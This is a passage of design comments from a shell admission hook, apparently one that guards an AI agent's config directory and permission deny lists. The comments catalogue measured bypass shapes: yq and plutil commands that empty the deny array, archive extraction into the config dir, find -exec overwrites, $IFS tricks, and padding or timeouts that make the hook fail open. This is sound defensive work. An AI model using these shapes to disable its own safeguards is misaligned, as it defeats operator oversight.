    of the patterns.
  • `sudo tar -x -C ~/.claude` needs no CMDPOS clause — the tokenizer peels
    the wrapper, and does it for every wrapper rather than the two that were
    spelled out.

`tar -cf backup.tar ~/.claude` still passes: creating an archive only READS
the directory, which is why the verb alone was never enough.
The extract flag is matched as a WHOLE token, so the length bound that kept
`--exclude=` (which contains an x) from reading as extract is now doing real
work rather than guarding against a span that ran too far.
```

## bin/admission-bash.sh, lines 2109-2125 (before this edit)

```text
ONE dash for a letter bundle; two only for the spelled-out long options.
`-{0,2}` let `--xz` — a COMPRESSION selector, two dashes, empty prefix, `z`
suffix — read as an extract flag, so `tar --xz -cf backup.tar.xz -C ~/.claude`
(a backup, which only READS) was blocked (pass 12, P12-argv-fp-04). `--get` is
GNU tar's documented third spelling of extract and was missing (P12-argv-08).
THE BUNDLE IS NOT LENGTH-BOUNDED (docs/explanation/admission-baseline.md P12-argv-10, reproduced
2026-08-30). Four letters each side of the x meant `tar -xvvvzf a.tgz -C
~/.claude` was not recognised as extract mode at all, so the segment scored
read-only and bought the exemption that skips all four archive rules — exit 0
on the shape the rules exist for. tar accepts any number of letters in a
bundle and the bound answered no question; arch_dests, two screens down, has
always used the unbounded `-[A-Za-z]*C` for the same argument.

THE DIRECTION IS TOWARD BLOCKING, which is why this is safe to widen: a token
matching TAR_XTOK clears _ARCH_RO, so a wider match exempts LESS, never more.
`tar -tzf x.tgz` carries no x and stays read-only; `--exclude=…` cannot match,
because a second `-` is outside the letter class.
```

## bin/admission-bash.sh, lines 2130-2168 (before this edit)

```text
── ARCHIVE MODE AND DIRECTION (pass 13) ────────────────────────────────────
The four rules below fire when an archive verb NAMES the config dir. Naming is
not writing, and pass 13 measured what conflating them costs: the operator's
own backup-and-restore path was refused end to end, at exit 2 —

  unzip -l ~/.claude/backups/config-baseline-20260801-115132.tgz
  tar -xzf ~/.claude/backups/config-baseline.tgz -C /tmp/restore
  ditto ~/.claude /tmp/backup

— while B6's OWN block message is what sends the operator to deploy-restore.sh. A
control that forbids the recovery it prescribes is a control that gets turned
off, and a disabled guard protects nothing (CONSTITUTION No.2.11). `unzip -l`
is the clearest case: it lists a table of contents and writes not one byte.

The rule is not wrong, it is under-specified. Pass 10 proved the real bypass —
an extractor rewrites every guard at once — so the answer is to ask the two
questions that separate a backup from an overwrite:

  MODE      `tar -t`, `tar -c`, `unzip -l`, `unzip -t`, `cpio -t` and a bare
            `pax` cannot create a file anywhere. The config dir in their argv
            is a SOURCE.
  DIRECTION the config dir has to be the DESTINATION. `ditto ~/.claude
            /tmp/backup` copies OUT; `ditto /tmp/evil ~/.claude` copies IN.
            tar's destination is `-C`, unzip's `-d`, cpio's `-D`, ditto's is
            its LAST operand — argv position, not string presence.

EVERYTHING UNPROVEN BLOCKS. The exemption is granted only where argv answers
the question outright, so each of these keeps its exit 2:
  • an EMPTY segment table — oversized payload, missing awk, a `-C $(echo
    ~/.claude)` the tokenizer cannot see. The flat rules exist for exactly
    those shapes, so an exemption computed from a table that is not there
    would hand back every one of them. The gate needs the table to say yes.
  • NO destination in argv, which means the CURRENT directory. `tar xzf
    x.tgz` overwrites whatever is in the cwd, and this hook is not told what
    the cwd is — so the shape is dangerous precisely when the cwd IS the
    config dir, and it cannot be ruled out from here.
  • `patch`, which reconstructs its targets from the diff body rather than
    from argv. No argument says where it writes, so it is never exemptible.

```

## bin/admission-bash.sh, lines 2169-2185 (before this edit)

```text
arch_dests <letter> <long-ERE> — every destination argv names, one per line.
Reads args on stdin, one token per line. Handles `-C dir`, a bundle whose LAST
letter is the option (`tar -xzC dir`), `--directory dir` and `--directory=dir`.
ALL of them, not the last one: tar honours `-C` repeatedly, so "the final -C
is outside the config dir" is not an answer to "does anything land inside it".
NOT case-folded, deliberately — tar's `-c` (create) and `-C` (chdir) are
different options and `hit`'s -i would fuse them.

THE DASHLESS BUNDLE IS NOT OPTIONAL. tar's old-style spelling `tar xzC dir -f
a.tgz` carries no leading dash, and requiring one is the exact defect docs/explanation/admission-baseline.md
pass 11 recorded as critical: a rule that catches only the less common
spelling of a command is not a rule. This fix reproduced it — `tar xzC
~/.claude -f /tmp/evil.tgz` went from 2 to 0 while the dashed spelling still
blocked — and it was caught by re-running the must-block list, not by reading.
The dashless form is accepted ONLY as the FIRST argument, which is tar's own
constraint on it. Accepting it anywhere would let a member literally named `C`
manufacture a destination and buy an exemption.
```

## bin/admission-bash.sh, lines 2235-2237 (before this edit)

```text
-l -t -v -z -p -c are unzip's read-only modes: list, test CRCs, verbose
list, print the archive comment, member to stdout. Lowercase only —
-L, -C, -P and -V are unrelated options.
```

## bin/admission-bash.sh, lines 2268-2276 (before this edit)

```text
NO destination in argv. For a verb that then targets the CWD, the config dir
named here is a SOURCE — it is the archive being read. Blocking that refused
`cd /tmp/restore && tar xzf ~/.claude/backups/b.tgz`, which is the restore
path with the `-C` left off (found by probing this fix, not by the brief).
Nothing is given up: the danger is the cwd BEING the config dir, and that is
equally true of `tar xzf /tmp/evil.tgz`, which names no config path at all
and never reached these rules. The cwd question has one owner — the
cd-then-extract rule below, where the cd is in the same command and the
answer is actually knowable.
```

## bin/admission-bash.sh, lines 2288-2292 (before this edit)

```text
Redirect targets, split by DIRECTION. floor_seg_has folds them in with the
arguments — right for `cat k > ~/.claude/x`, wrong here: `cpio -t <
~/.claude/backups/b.cpio` reads an archive out of the config dir and was
blocked for naming it (found by probing this fix). `<` is a source, `>` is a
write, and the two cannot share one answer.
```

## bin/admission-bash.sh, lines 2300-2302 (before this edit)

```text
EVERY archive segment that names the config dir is provably outbound or
read-only. One segment that is not — `unzip -l ok.zip && unzip evil.zip -d
~/.claude` — refuses the whole command.
```

## bin/admission-bash.sh, lines 2312-2314 (before this edit)

```text
An OUTPUT redirect landing in the config dir is a write no matter what the
verb's own mode says, so it settles the segment before mode or direction
is consulted.
```

## bin/admission-bash.sh, lines 2316-2330 (before this edit)

```text
AND AN INPUT REDIRECT IS A SOURCE — the other half of the sentence three
comments up, which was written and then only half applied (docs/explanation/admission-baseline.md
P12-argv-fp-05, reproduced 2026-08-30). If the config dir is named ONLY in
a `<` redirect — never in argv, never in an output redirect — the segment
READS an archive or a diff out of the config dir and writes nowhere near
it. `patch -p1 < ~/.claude/patches/fix.patch` patches the CURRENT project
and exited 2 as "an extractor is writing into the Helm config directory".

THIS IS WHY THE TEST HAS TO SIT HERE rather than in arch_seg_class. patch
is deliberately never exemptible there — it reconstructs its targets from
the diff BODY, so no argument says where it writes — and that ruling is
right and stays. But it answers "where does patch write", and the config
dir being its INPUT is not a claim about that. Blocking here bought no
protection either: the identical patch kept in /tmp writes the identical
files and is allowed, so the rule only ever caught the tidy operator.
```

## bin/admission-bash.sh, lines 2345-2369 (before this edit)

```text
── find -exec WITH NO PATH IN IT — arch_any_writes_cwd's shape, with find in
front of it (P13-fs-06, refusal #3 of the previous attempt).
`cd <cfg>/bin && find . -name '*.sh' -exec cp /tmp/evil {} \;` names the config
dir NOWHERE: the search root is `.`, so the substituted placeholder is `./*.sh`
and every path-matching rule in this file — argv and flat alike — sees a `cp`
whose operands are both relative. This is the only place the cwd is knowable,
for the same reason cd-cfg-then-extract is: the `cd` is in the same command.

THREE CONDITIONS, and each one is a false positive if dropped:
  RELATIVE ROOT  an ABSOLUTE root is judged by the path rules, and one outside
                 the config dir (`cd <cfg> && find /tmp -exec cp /tmp/e {} \;`)
                 writes to /tmp — blocking it would be a plain false positive.
  PLACEHOLDER LAST  DIRECTION, and it is the whole of it for this family: the
                 destination of cp/mv/install/rsync/ditto IS the last operand,
                 so `-exec cp {} /tmp/backup \;` — copying the config dir OUT,
                 the first step of the operator's own backup — is `mid` and
                 passes, while `-exec cp /tmp/evil {} \;` is `last` and blocks.
  A WRITING VERB  `-exec grep -l x {} \;`, `-exec shellcheck {} \;` and
                 `-exec cat {} \;` are how you AUDIT the floor from inside it,
                 and harbor#107 is the record of what refusing that costs.
The list is deliberately NOT the flat arm's list below. That one matches a
WORD anywhere in the text, so a search term (`grep -c sponge`) can trigger it
and it has to stay minimal; this one matches a segment's RESOLVED COMMAND, so
an extra verb cannot be reached by naming it. In-place editors join on their
own flag, because `sed`/`perl`/`python`/`yq` without one only read.
```

## bin/admission-bash.sh, lines 2373-2378 (before this edit)

```text
The placeholder-position test is written ONCE, as a variable, and the predicate
below reads it in exactly one place. Spelled inline it was two copies of one
predicate, and a mutation of either left the other still enforcing it — so the
assertion that was supposed to pin DIRECTION could not fail, which is worse
than not having it (No.2.10). Measured: inverting this ONE token turns four
blocks and one pass red together.
```

## bin/admission-bash.sh, lines 2380-2394 (before this edit)

```text
ONE AWK PASS, NOT A LOOP OF FORKS, and that is a security property rather than
tidiness (implementation review). A cap on how many children the tokenizer
expands is a place a payload can be pushed past, and the first draft's cap of
six was reachable: `-exec ls {} \;` six times in front of the payload measured
exit 0 while the unpadded spelling blocked (QA plan R4 — padding must never
switch a rule off). Removing the cap is only affordable if a child is cheap on
this side too; the draft this replaces walked the SEGF ids in shell at four
forks per child, which is the cost that makes an uncapped table a latency
question, and latency in a PreToolUse hook is itself a fail-open path. Here a
child costs a comparison. Measured flat: 1, 12 and 40 clauses all answer in
~310-330 ms, against ~290-306 ms for the same shapes before the change.

The four inputs arrive as INPUT LINES, not as `-v` assignments, for the reason
floor_seg_cwd_under states: awk runs escape processing over a -v value. Only
the first four lines are read as configuration, so no table row can pose as one.
```

## bin/admission-bash.sh, lines 2397-2398 (before this edit)

```text
A builtin test before any fork: no find child, nothing to ask. Latency in a
PreToolUse hook is a fail-open path (the ARCH_OUT note above).
```

## bin/admission-bash.sh, lines 2402-2407 (before this edit)

```text
NO APOSTROPHES ANYWHERE BELOW, comments included. This awk program is a
single-quoted shell string, so one apostrophe ends it and the shell
re-parses the rest. Measured in guard-lib during this same change: two of
them in a comment made a veto return 0 for every heredoc — a total
fail-open — with lint still green. floor-test catches it loudly; nothing
else will warn the next editor.
```

## bin/admission-bash.sh, lines 2412-2416 (before this edit)

```text
SEGF:<child>:<parent>:<ph>:<root> — a child whose placeholder lands in the
LAST argument (destination position) and whose search root is RELATIVE, so
the walk is the cwd this fold has already established is the config dir. An
ABSOLUTE root is judged by the path rules instead, and one pointing
elsewhere writes elsewhere.
```

## bin/admission-bash.sh, lines 2429-2430 (before this edit)

```text
Collected for every segment and consulted only for the wanted ones, so the
answer cannot depend on whether SEGF happens to be emitted before SEGC.
```

## bin/admission-bash.sh, lines 2445-2452 (before this edit)

```text
Computed ONCE. A PreToolUse hook that exceeds its timeout is SKIPPED, so a
per-rule recomputation is not a style question — latency is a fail-open path.
harbor#715's unwrap, for the extractor family (P12-argv-04): `unbuffer`, `chroot /srv`
and the next wrapper hid the tool word here as they did in guard-cloud. Before
ARCH_OUT, so the direction test reads the same table the rules do.
NOT patch or ditto (pass 13, P13E-1): the walk takes any bare word, and neither has a
mode the direction test can read, so 'git log -S patch -- <cfg>/settings.json' became
a write. tar/unzip/cpio/pax carry their mode and classify as reads there.
```

## bin/admission-bash.sh, lines 2459-2462 (before this edit)

```text
ONE gate over ALL FOUR rules. Exempting only the argv pair would have moved
the false positive rather than fixed it: the flat pair below matches the same
three commands, so `unzip -l ~/.claude/backups/x.tgz` would still have exited
2 — with a different rule id in the message.
```

## bin/admission-bash.sh, lines 2468-2481 (before this edit)

```text
THE FLAT FORM, RESTORED ALONGSIDE (pass 12, P12-migration-01, critical).
Stage 2 REPLACED these instead of keeping them — the rm family was migrated
additively and this one was not, and the commit message claimed otherwise.
The consequence was measured: twelve shapes that blocked at 8da7855 passed at
HEAD, every one of them a case where the operand is not a literal token —
`-C $(echo ~/.claude)`, a variable assembled at runtime, an oversized payload
where the tokenizer is skipped. argv is more precise; flat reaches further.
Neither is a superset of the other, so the floor needs both.
TAR_XNOO, not TAR_X (harbor#111): a mode bundle carrying O extracts to stdout,
so this segment writes nothing. `[^;&|]*` already bounds the match to ONE
segment, so judging each on its own bundle is correct — a compound that reads
with -O in one segment and extracts for real in the next still blocks on the
second. The argv pair above keeps the plain extract mode: it has the segment table and answers
the question precisely, and weakening it would trade accuracy for nothing.
```

## bin/admission-bash.sh, lines 2487-2493 (before this edit)

```text
harbor#1313 — an extraction INTO a dir above the config dir writes into it. The archive's member
paths, not argv, decide where files land, so `-C /` or `-C ~` reaches <cfg> through a member named
under it, and the four rules above only ask whether the destination IS the config dir. The
bind-mount rule's set (harbor#797): `/`, `~`, `$HOME` and each ancestor of the config and live
dirs. Outside ARCH_OUT, which a config backup restored over `/` would otherwise buy. A relative
destination stays unjudged: the cwd is not known here (harbor#776). A writing mode only, so a
list or a create rooted at `/` passes.
```

## bin/admission-bash.sh, lines 2518-2520 (before this edit)

```text
The flat form, for the payload with no table (oversized): `(/+..?)*` keeps any climb from an
ancestor an ancestor, so `/.`, `//` and `~/..` need no list of their own. Root needs its `/`:
an empty alternative would read every `-C dir` as `-C` and a space.
```

## bin/admission-bash.sh, lines 2533-2608 (before this edit)

```text
ORDERING, AND THE COMMAND LIST. This rule accepts the in-place FLAG anywhere
AHEAD of the surface, which is how every one of these tools is actually
invoked; jq-rewrites-surface below accepts it only AFTER, which is how none of
them is. That asymmetry is what let an in-place writer through, and the fix is
to name the writers here rather than to bolt an ordering onto the sink rule.

`yq` IS THE ONE THAT MATTERS, and it is not jq. Measured 2026-08-03:
  yq -i '.permissions.deny = []' ~/.claude/settings.json          exited 0
  yq e -i '.a=1' ~/.claude/settings.json                          exited 0
  yq --inplace '.a=1' ~/.claude/settings.json                     exited 0
  yq -i '.jobs.build.steps += [...]' .github/workflows/ci.yml     exited 0
yq edits YAML and JSON in place for real, and .github/workflows/** is a
$SURFACE (harbor#88), so the workflow shape is a live path to the gate that
judges the agent. Both spellings are covered: yq's long flag is `--inplace`,
GNU's convention is `--in-place`, hence `--in-?place`.

jq IS DELIBERATELY NOT IN THIS LIST, and a future reader should not "restore"
it. jq has never shipped in-place editing — that is why `sponge` exists —
and this box confirms it: jq-1.7.1-apple, `-i` and `--in-place` both absent
from --help. So `jq -i '.permissions.deny=[]' <surface>` writes NOTHING; it
exits 2 with "Unknown option". Passing it was CORRECT, not a hole, and an
earlier revision of this comment called it one. Adding jq here bought no
security and cost three false positives on ordinary reads (D1 below).

THE LEFT BOUNDARY IS THE OTHER HALF. `(-i|--in-place)` had no boundary, so any
token ENDING in -i satisfied it and the rule fired on reads that never asked
for anything in place:
  jq -f /tmp/filters/ci-i <surface>                    blocked — a filter file
  jq -r .x --rawfile note /tmp/notes/todo-i <surface>  blocked — a data file
Requiring whitespace before the flag fixes both while keeping every real form:
`sed -i.bak`, `sed -i ''`, `sed … -i`, `perl -i -pe`, `perl -pe … -i` and
`python3 -m json.tool --in-place` all still block, because each has a space
immediately before the flag.

ONE RESIDUAL FALSE POSITIVE IS KNOWN AND LEFT, because the cure is worse: a
COMMAND SUBSTITUTION carrying a -i flag — `python3 … $(uname -i) <surface>` —
has whitespace before the -i and still matches. It predates this change,
affects sed/perl/python identically, and cannot be excluded without parsing
$( ) out of the command text, which is the "not decidable from command text"
lesson that already cost this file a withdrawn rule in pass 10.
NO LEFT BOUNDARY ON THIS RULE, and that is the second answer to the same
question. A first attempt required [[:space:]] before the flag, to stop a
FILENAME ending in -i (`ci-i`, `todo-i`) reading as a request to edit in place.
It was a REGRESSION: whitespace in the command TEXT is not the predicate "this
token starts a word", so an expansion producing the separator at runtime walked
straight through. Measured against main and against that attempt:
  sed${IFS}-i${IFS}'' ... <surface>    main BLOCK -> attempt pass
  sed$IFS-i $IFS ...     <surface>     main BLOCK -> attempt pass
The second is not fixable by ANY left-character test: the character before -i
is the F of $IFS, indistinguishable from the o of todo-i. So the boundary is
gone from here and the false positives are killed at their actual source —
jq left this rule (it has no in-place mode at all), which is where every one of
the three measured FPs came from. What remains is the strict main behaviour.

THE FLAG IS A TOKEN, NOT A SUBSTRING. `--indent` contains `-i`, and adding yq
put a real read-only flag in range: `yq --indent 4 . <surface>` blocked. So the
short form must END at a separator, and `-i.bak` and `-i=x` are separators too.

AND THE FLAG MUST BE LOWERCASE, which needs a second, CASE-SENSITIVE pass.
hit() is grep -iEq deliberately — a case-insensitive filesystem resolves `SED`
and `RM`, so the COMMAND must be matched case-blind. The FLAG must not be: yq
ships `-i, --inplace` (a write) and `-I, --indent int` (formatting), one letter
apart and distinguished only by case, so under -i alone this rule blocked
`yq -I 4 . <surface>` — a read, and §2.11 exactly.

THE BUNDLE FORM closes a gap that predates all of this: `sed -Ei`, `-ni`,
`-nEi` are working in-place writes containing no `-i` substring at all, and
matched neither main nor the first attempt. perl and python never needed it —
interpreter-at-surface below catches them naming a surface at all — but sed is
not an interpreter by that rule's list.
The tail class is "not a flag character" rather than a list of separators.
Spelled as [.=] it missed `-i${IFS}` — the $ that follows is neither, and a
bare $ in the alternation is the end-of-line ANCHOR, not the character. Any
non-alphanumeric, non-hyphen tail ends the token, which keeps --indent out
(its next character is n) and lets in the quote, brace, dot and = forms.
Nor a slash: the case-strict pass reads the whole command, so a path segment such as `harbor-ci/` was a bundle.
```

## bin/admission-bash.sh, lines 2616-2622 (before this edit)

```text
dasel EDITS IN PLACE WITH NO FLAG TO KEY ON — `dasel put -f <file> …` rewrites
the file it is given, and so does `dasel delete -f`. The rule above cannot see
it, because there is no -i anywhere in the line. Named by VERB instead, which
is safe to be blunt about: there is no reading form of `put` or `delete`, so a
session aiming either at a floor surface is never doing something legitimate.
Left unblocked when yq and gojq were added, this would have been the gap that
outlived the fix — the same shape as the one this whole pass started from.
```

## bin/admission-bash.sh, lines 2626-2695 (before this edit)

```text
── P13-fs-04 · plutil MODE (harbor#94) ──────────────────────────────────────
`plutil -replace permissions.deny -json '[]' ~/.claude/settings.json` zeroes
the deny array and leaves settings.json valid JSON. MEASURED 2026-08-05, not
inferred: the file went from `{"permissions":{"deny":["a","b"],…}}` to
`{"hooks":…,"permissions":{"allow":[],"deny":[]}}` — same format, one array
emptied. It is B1's whole containment layer removed by a macOS binary that is
in no verb list here, in no interpreter list, and needs no redirect.

docs/explanation/admission-baseline.md RECORDED THIS AS HAVING NO SHAPE, and that finding is wrong. The
argument was that `plutil -replace <keypath> <operand>` is structurally
identical to `jq . <operand>` and `unzip -l <operand>`, so only knowing what
plutil DOES separates them — "a verb list by definition". Both halves of that
are true and the conclusion does not follow, because knowing what a verb does
to the file it names is what arch_seg_class above IS: tar's `x`, unzip's
`-l -t -v -z -p -c`, cpio's `-t`, `pax -rw`, ditto's last operand. EXTRACTOR,
ARCHCMD, SEG_NOWRITE, FINDVERB and the dasel rule directly above are five more.
A verb's documented behaviour is a FACT, checkable and stable; what the file
refuses is a list of DANGEROUS words, which is a judgement and drifts.

plutil is a strictly easier case than tar, and each of these was measured:
  MODE IS ONE LEADING SUBCOMMAND. `plutil <file> -remove k` is rejected outright
    ("unrecognized option: -remove", rc=1, file unchanged), so the mode cannot
    hide behind an operand. There is no letter bundling, no dashless spelling
    and no case pair — the three things that each broke a tar rule once.
  WRITE MODES: -replace, -insert, -remove, -convert, -create.
  READ MODES: -p, -lint (the default when no mode is given), -type, -extract,
    -help. All four of the first were run against a copy and `cmp` proved the
    input byte-identical afterwards. Nothing here fires on any of them.
  DIRECTION NEEDS NO POSITION WALK. In a write mode plutil rewrites EVERY file
    operand — `plutil -remove hooks m1.json m2.json` mutated both — so "some
    token names the config dir" is not an approximation of the answer, it IS
    the answer. tar needed arch_dests only because its destination is a flag.
  -create IGNORES -o AND -e. `plutil -create json -o /tmp/c.json b.json`
    truncated b.json to `{}` and never created /tmp/c.json, and `-create json
    -e plist i.json` did the same. It also wipes a NON-plist: `plutil -create
    json fake-guard.sh` left `{}` where a shell script was, which is how this
    reaches <cfg>/bin as well as settings.json.

THE ONE EXEMPTION, AND WHY IT IS SAFE HERE AND NOWHERE ELSE. `-o path` diverts
the output and leaves the named file untouched (`-convert xml1 -o /tmp/o.plist
t3.json` → t3.json byte-identical), so `plutil -convert json -o - <surface>`
is a READ and must not block — §2.11, and it is the shape a person reaches for
to look at the file. The exemption is granted ONLY for -convert, because only
there is a `-o` token provably the option:
  • -replace/-insert take a `-type value` pair, and the value can BE `-o`.
    Measured: `plutil -replace permissions.deny -string -o /tmp/x g.json` set
    deny to the string "-o" and REWROTE g.json. A rule that exempted on "an
    -o token is present" would hand back the headline bypass for one token —
    the same one-word shape that disqualified the previous attempt at this fix.
  • -convert's value is a format specifier, and plutil rejects `-o` as one
    ("Unknown format specifier: -o", rc=1, nothing written). So in any
    -convert that runs at all, `-o` is the option and not a value.
  • ALL -o values count, not the last. Two `-o`s write only the last, but
    "the last one is outside the config dir" is not an answer to "does
    anything land inside it" (arch_dests' own lesson).
  • `-e ext` also diverts (`-replace … -e plist a.json` → a.plist), but it
    CANNOT be treated as one: `-convert xml1 -e json f.json` rewrote f.json
    itself, because the diverted name is the stem plus the new extension and
    `-e json` on a .json file is the same path. So an `-e` token CANCELS the
    exemption and the operands are treated as written. The residual is a
    `-e <other-ext>` aimed at the config dir, which blocks though it writes
    `<cfg>/settings.plist` rather than settings.json — a write INTO the config
    dir either way, which is exactly what this rule claims to stop.

A SEGMENT RULE, NOT A FLAT ONE, for two measured reasons. It reads SEGC — the
command word with wrappers PEELED — so `sudo plutil …` and `env X=1 plutil …`
need no clause of their own. And a flat `plutil` would fire on the word
wherever it lands: `git commit -m "plutil -replace … ~/.claude/settings.json"`
and a heredoc documenting this rule are the harbor#107 and pass-11 `patch`
false positives, which cost this file two rules already.
```

## bin/admission-bash.sh, lines 2698-2702 (before this edit)

```text
Every value of a literal `-o`, one per line. plutil CREATES that file whatever
the mode is — `-extract k json -o /tmp/x.json f` wrote /tmp/x.json — so an -o
value is a write target unconditionally. It is also the token that overlaps
P13-fs-03's own shape, so the two fixes agree here rather than leaving a
plutil-shaped hole in a plutil rule.
```

## bin/admission-bash.sh, lines 2711-2737 (before this edit)

```text
plu_classify — one line per fact, so ONE pass answers both questions the two
arms below ask:
  `W:<token>`  a token this invocation can WRITE
  `X`          this segment writes its OPERANDS (a write mode, not diverted)
  `D`          this segment does NOT (a read mode, or output diverted by -o)
The X/D marker is what makes the flat arm's veto a POSITIVE determination
rather than "no config path was spotted" — see the veto's own comment.
plu_operands — the FILE operands of a write-mode invocation, with the mode's own
METADATA excluded. plutil's write syntax is `-replace <keypath> -<type> <value>
<file>…`, so marking every argument writable blocked
  plutil -replace k -string <surface> /tmp/prefs.plist
which stores that path as a STRING inside /tmp/prefs.plist and leaves the surface
byte-identical (Codex, harbor#138 — measured BLOCK, a §2.11 false positive: a
control that refuses ordinary work gets switched off).

EXCLUSION IS POSITIVE, NEVER A GUESS. Only a token this function can NAME as
metadata is dropped — the keypath or format directly after the mode flag, a type
flag, and that flag's value. Anything unrecognised stays an operand and still
blocks, so a spelling this list has not learned fails toward REFUSING rather than
toward allowing. `-array` and `-dict` carry no value and must not eat the next
token, which would be the file.
Prints `O:<tok>` for an operand and `M:<tok>` for metadata. BOTH are needed: the
flat arm below cannot be vetoed by "no config path was found among the operands",
because that is also true of `S=<surface>; plutil -remove k "$S"` — the bypass the
flat arm exists to close. What separates the two is that in the false-positive
case the argv layer SAW this surface and positively classified it as metadata,
while in the `$S` case the surface is not in the command text at all.
```

## bin/admission-bash.sh, lines 2789-2791 (before this edit)

```text
Computed ONCE, like ARCH_OUT and for the same reason: a PreToolUse hook that
exceeds its timeout is SKIPPED, so latency is a fail-open path. All three arms
— this one, the flat one below and the cwd-fold arm far below — read these.
```

## bin/admission-bash.sh, lines 2794-2797 (before this edit)

```text
PLU_RO — the table POSITIVELY determined that every plutil segment it saw is a
read or is diverted. Not "no config path was found": that reading would veto
the flat arm for `S=<surface>; plutil -remove k "$S"`, whose argv carries `$S`
and no path at all, which is the exact bypass the flat arm exists to close.
```

## bin/admission-bash.sh, lines 2802-2811 (before this edit)

```text
PLU_META_ONLY — the argv layer SAW a config path in this plutil invocation and
positively classified it as MODE METADATA rather than a file operand. That is the
only thing that separates
  plutil -replace k -string <surface> /tmp/prefs.plist    (writes /tmp, harmless)
from
  S=<surface>; plutil -remove k "$S"                      (writes the surface)
because neither has a config path among its OPERANDS — the first has it as a value,
the second has it in a variable the argv layer cannot see. Vetoing the flat arm on
"no operand named the config dir" would hand back the second, which is precisely
the bypass that arm exists to close (Codex, harbor#138).
```

## bin/admission-bash.sh, lines 2817-2819 (before this edit)

```text
…and NOT also an operand. A surface that is both — `plutil -replace k -string
<surface> <surface>` — is a write and must not buy an exemption from its own
appearance as a value.
```

## bin/admission-bash.sh, lines 2830-2862 (before this edit)

```text
THE FLAT ARM, AND IT IS NOT A DUPLICATE OF THE ONE ABOVE. It answers the two
shapes argv cannot see, both MEASURED open against the argv rule alone and both
already CLOSED for this rule's siblings — which is the asymmetry that makes it
necessary rather than belt-and-braces:
  S=<surface>; plutil -remove permissions.deny "$S"     argv blind, sed blocks
  plutil -remove permissions.deny $(echo <surface>)     argv blind, sed blocks
The segment table carries the LITERAL token `$S`, so no argv rule in this file
can answer either; $TARGETS carries floor_expand_vars' and VALU's renderings,
which is why the flat sed and cp rules do. Over FLOOR_MAX_NORM it is also the
only arm left, so padding a command cannot switch this rule off (QA plan R4).

THREE GATES KEEP IT OFF ORDINARY WORK, each measured against a shape that
blocked without it:
  • $CMDPOS — plutil must START a command. Without it `git commit -am '<this
    command>'` blocked, because a single-quoted argument DOES reach $TARGETS
    (a double-quoted one does not — the tokenizer files it as CODE). That is
    the harbor#107 incident, and the B8 assertions pin the same shape for
    `--live`. `/usr/bin/grep -n 'plutil -remove' <cfg>/CLAUDE.md` is the other
    one: the words are adjacent in $TARGETS but plutil does not start a command.
  • $SINK_RO — the harbor#107 veto itself, for the case where every command
    word in the pipeline is a reader. MEASURED REDUNDANT and kept anyway:
    removing it alone changes no assertion in the suite (0 failures), because
    plutil sitting at a command position in $TARGETS already implies it is a
    segment command word, which implies SINK_RO=0. Removing it TOGETHER with
    $CMDPOS turns two red. It stays because every other flat write rule in this
    file gates on it for this exact class, and being the one that does not is
    how the next reader concludes the veto is optional.
  • PLU_RO — the argv layer's positive read/diversion determination. Without
    it `plutil -convert json -o - <surface>` blocked: the flat form cannot
    model the -o exemption, so it defers to the layer that can.
NARROWER than the argv arm by design — $SURFACE, not the whole config dir —
because a flat regex has no token boundaries to make CFG_TOK's `(/|$)` mean
what it says.
```

## bin/admission-bash.sh, lines 2868-2901 (before this edit)

```text
An interpreter is a universal file writer, so no verb list can be complete:
node -e "fs.writeFileSync(…)" and python -c "open(…,'w')" match none of the
verbs above (red-team pass 3). Any interpreter naming a floor surface is
denied regardless of how it intends to touch it.

$SINK_RO IS THE ONLY GATE, AND IT CANNOT OPEN A HOLE (harbor#164). SINK_RO=1
means EVERY segment command word is in $SEG_NOWRITE — grep, cat, head, wc, echo
and friends — and an interpreter that is actually being INVOKED is itself a
segment command word, which is not in that list. The exemption is therefore
reachable only when the interpreter's name arrives as an ARGUMENT. That is an
argument about reachability, not a judgement about intent, which is why it is
safe to apply to a rule with no argv arm to fall back on.

THE FALSE POSITIVE IT REMOVES, measured on the live box on 2026-08-06:
  /usr/bin/grep -c "runner" <a workflow>   allowed — 42 matches
  /usr/bin/grep -n "bun"    <the same>     BLOCKED
One command, one path, one read-only intent; the only difference is the word
being searched for. Quote-stripping is why the rule cannot tell them apart —
after it, `grep "bun" <path>` and `bun <path>` are the same token sequence — so
the rule asks the question that CAN be answered instead: is anything in this
command capable of writing at all. Same veto and same reasoning as the
harbor#107 arm on the plutil rule above, which exists for the same shape.

It cost three blocked commands in one session, and one of them was a `git
commit` whose MESSAGE described the defect. The escape hatch the block prints
turns off the entire floor, so the real cost of this false positive was never
the detour — it was the temptation.

NOT FIXED HERE, and left visible rather than papered over: `git grep -n "node"
-- <a surface>`. `git` is not in $SEG_NOWRITE and must not be, because `git
checkout <surface>` writes, so SINK_RO stays 0 and that read stays blocked.
Telling a git READ subcommand from a git WRITE needs the segment's second word,
which the segment table does not carry. The workaround is /usr/bin/grep and the
residual is tracked on harbor#164.
```

## bin/admission-bash.sh, lines 2903-2959 (before this edit)

```text
── harbor#334-B · WHOSE ARGUMENT IS THE SURFACE ────────────────────────────
$SINK_RO asks whether ANYTHING in the command can write. An interpreter can,
so a python segment that never touches a file withdraws the veto for every
LATER segment — and then `.*` carries the rule across the `;`. Measured
against the live floor 2026-09-07, every one BLOCKED:
    python3 -c 'print(1)'; grep -n x <a workflow>
    python3 -c 'print(1)'; wc -l <a workflow>
    python3 -c 'print("k >", 1)'; wc -l <a workflow>
    node -e 'console.log(1)' && grep -c x <a workflow>
In each one the interpreter segment names no surface at all and the segment
that does is a read. Reversing the order ALLOWS, which is what shows the block
is positional rather than about capability. §2.11: this is the shape of
reading a scaffolded workflow with any interpreter earlier in the compound,
and the hatch the block prints turns off the whole floor.

THE OBVIOUS FIX IS A BYPASS, AND THE SUITE SAID SO. Narrowing the span to
`[^;&|]*` — which dd-at-surface one line below has always used, and which
floor_bash_targets' own note calls the discipline — turns `S6 heredoc
interpreter` red. floor-normalize folds a heredoc newline AS `;`:
    python3 - <<EOF ; open(<cfg>/settings.json,w).write({}) ; EOF
so a fed interpreter and a `;`-separated later read are the SAME SHAPE to any
flat regex. That is why the span is still `.*` and why this is a segment
question instead.

THE SEGMENT TABLE SEPARATES THEM WHERE THE FLAT TEXT CANNOT. In the heredoc
fold the surface is a command WORD — `SEGC:3:<cfg>/settings.json,w`, body text
parsed as a word — while in the false positives it is an ARGUMENT of a reader:
`SEGC:2:grep` with `SEGA:2:<the workflow>`. So the veto asks exactly that, and
nothing wider.

ONE AWK PASS, NO PER-SEGMENT FORKS. P12-perf-04 records why: the first cut of
the git exemption looped per segment and an 8KB payload took 10s, past the
hook timeout — and a hook that times out FAILS OPEN, which makes a slow
